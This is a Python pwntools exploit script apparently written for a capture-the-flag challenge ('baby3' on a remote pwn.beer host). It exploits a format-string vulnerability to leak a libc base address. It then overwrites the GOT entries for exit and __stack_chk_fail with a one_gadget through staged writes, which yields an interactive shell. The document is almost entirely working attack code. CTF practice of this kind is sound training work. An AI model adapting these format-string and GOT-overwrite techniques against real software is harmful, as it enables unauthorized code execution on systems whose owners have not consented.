from pwn import *


#p = process("./baby3", env={"LD_PRELOAD":"./libc.so.6"})
p = remote("baby-01.pwn.beer", 10003)
#gdb.attach(p, '''
#        b *0x04005f0
#''')

# overwrite exit got to main
payload = fmtstr_payload(6, {0x0603040: 0x40076f + 3}, write_size='int')

# format offset
payload = "%4196207c%{}$n".format(8)
payload += "A"*3
payload += p64(0x00602048)

p.recvuntil("input:")
p.sendline(payload)

# leak libc

p.recvuntil("input:")
p.sendline("%3$p")

a = int(p.recvline()[1:-1], 16)
print hex(a)
libc = a - 0x110081
print "base", hex(libc)


# partial overwrite stack_chk_fail with one_gadget,
# then write exit -> stack_chk_fail

stack_chk = 0x0602020


# rcx == null
one_gadget = libc + 0x4f322

print "[~] write 1"
#write #1
payload = fmtstr_payload(6, {stack_chk: (one_gadget & 0xffffff)+4 }, write_size='int')[4:]
payload = payload.replace("%6$n", "%9$n")

payload += "A"*(8+3)
# format offset
#payload += "C"*8
payload += p64(stack_chk)
payload += "%9$p"
p.sendline(payload)


p.recvuntil("AAAAAAAAA")


#write #2
print "[~] write 2"
p.recvuntil("input")
payload = fmtstr_payload(6, {stack_chk+3: ((one_gadget >> 8*3) & 0xffffff)+4 }, write_size='int')[4:]
payload = payload.replace("%6$n", "%9$n")
#payload = len(payload) * "A"

payload += "A"*(8+3)
# format offset
#payload += "C"*8
payload += p64(stack_chk+3)
payload += "%9$p"
p.sendline(payload)

p.recvuntil("input:")

# exit -> stack_chk

payload = fmtstr_payload(6, {0x0603040:0x4005f0}, write_size='int')[4:]

print payload
print hexdump(payload)

payload = "%4195824c%8$n"

payload += "A"*3

payload += p64(0x0602048)
#payload += "C"*8

payload += "%8$p"

p.sendline(payload)

p.recvuntil("AAA")

print hex(one_gadget)



p.interactive()
